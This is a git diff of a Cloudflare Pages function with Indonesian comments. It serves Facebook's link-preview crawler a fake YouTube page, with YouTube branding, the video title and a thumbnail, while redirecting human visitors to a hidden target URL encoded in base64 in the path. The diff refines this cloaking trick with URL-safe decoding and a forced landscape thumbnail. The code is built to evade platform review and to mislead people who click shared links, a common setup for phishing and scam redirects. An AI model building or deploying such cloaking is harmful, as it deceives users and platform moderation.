@@ -3,22 +3,19 @@ export async function onRequest(context) {
   const url = new URL(request.url);
   const ua = request.headers.get("user-agent") || "";
   
-  // Mengambil path di belakang domain (misal: /aHR0cHM6...)
+  // Mengambil path di belakang / (Contoh: Base64YT.Base64Tujuan)
   const fullPath = params.path ? params.path.join('/') : "";
 
-  if (!fullPath || fullPath === "index.html") {
-    return context.next();
-  }
+  if (!fullPath || fullPath.includes("index.html")) return context.next();
 
   try {
-    // Decode data dari path (Format: Base64YouTube.Base64Tujuan)
     const [sEnc, uEnc] = fullPath.split('.');
     if (!sEnc || !uEnc) return context.next();
 
-    const sourceUrl = atob(sEnc);
-    const targetUrl = atob(uEnc);
+    // Decode Base64
+    const sourceUrl = atob(sEnc.replace(/-/g, '+').replace(/_/g, '/'));
+    const targetUrl = atob(uEnc.replace(/-/g, '+').replace(/_/g, '/'));
 
-    // LOGIKA PREVIEW UNTUK BOT FACEBOOK
     if (ua.includes("facebookexternalhit") || ua.includes("Facebot")) {
       const response = await fetch(sourceUrl, {
         headers: { "User-Agent": "facebookexternalhit/1.1" }
@@ -32,14 +29,13 @@ export async function onRequest(context) {
       };
 
       const title = getMeta("title") || "YouTube";
-      const desc = getMeta("description") || "";
+      const desc = getMeta("description") || "Tonton video selengkapnya di YouTube.";
       
-      let videoId = sourceUrl.includes("v=") ? sourceUrl.split("v=")[1].split("&")[0] : sourceUrl.split("/").pop().split("?")[0];
-      const image = `https://i.ytimg.com/vi/${videoId}/maxresdefault.jpg`;
+      // Paksa ambil thumbnail kualitas tinggi agar LANDSCAPE
+      let vId = sourceUrl.includes("v=") ? sourceUrl.split("v=")[1].split("&")[0] : sourceUrl.split("/").pop().split("?")[0];
+      const image = `https://i.ytimg.com/vi/${vId}/maxresdefault.jpg`;
 
-      return new Response(`<!DOCTYPE html>
-      <html>
-      <head>
+      return new Response(`<!DOCTYPE html><html><head>
         <meta charset="UTF-8">
         <meta property="og:site_name" content="YouTube">
         <meta property="og:title" content="${title}">
@@ -50,14 +46,10 @@ export async function onRequest(context) {
         <meta property="og:type" content="video.other">
         <meta name="twitter:card" content="summary_large_image">
         <meta name="twitter:image" content="${image}">
-      </head>
-      <body></body>
-      </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
+      </head><body></body></html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
     }
 
-    // JIKA MANUSIA: Redirect Langsung
     return Response.redirect(targetUrl, 302);
-
   } catch (e) {
     return context.next();
   }
